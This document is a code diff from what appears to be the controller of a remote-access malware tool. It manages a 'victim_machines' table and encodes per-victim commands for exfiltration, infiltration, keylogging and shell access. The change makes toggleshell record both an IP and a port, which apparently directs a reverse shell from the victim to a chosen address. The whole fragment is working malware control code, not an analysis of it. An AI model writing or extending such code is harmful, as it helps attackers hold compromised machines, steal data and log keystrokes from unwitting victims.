@@ -20,7 +20,7 @@ def encode ( input ):
 	encoded_updated = updated_bytes.decode('ascii')
 	return encoded_updated
 
-def toggleshell( id, port ):
+def toggleshell( id, ip, port ):
 
 	#base query to check whether or not the id requested appears in the database
 	query = """ SELECT command, command_output FROM victim_machines WHERE victim_id =%s """
@@ -44,7 +44,8 @@ def toggleshell( id, port ):
 			decoded_command = decode(result[0][0])
 
 			json_data = json.loads(decoded_command)
-			json_data["shell"] = port
+			json_data["shell"]["ip"] = ip
+			json_data["shell"]["port"] = port
 #			print(json.dumps(json_data))
 
 			json_string = str(json.dumps(json_data))
@@ -65,7 +66,7 @@ def toggleshell( id, port ):
 			seconds_from_epoch = int(time.time())
 			empty_json = "e30="
 			default_group_id = 1
-			formatted_command = "{\"commands\": {}, \"exfiltrate\": {}, \"infiltrate\": {}, \"keylogger\": 0, \"shell\": " + port + "}"
+			formatted_command = "{\"commands\": {}, \"exfiltrate\": {}, \"infiltrate\": {}, \"keylogger\": 0, \"shell\": {\"ip\": \"" + ip + "\", \"port\": \"" + port + "\"}}"
 			formatted_encoded = encode(formatted_command)
 
 			create_query = """ INSERT INTO victim_machines (victim_id, group_id, command, command_output, command_record, file_names) VALUES (%s, %s, %s, %s, %s, %s) """
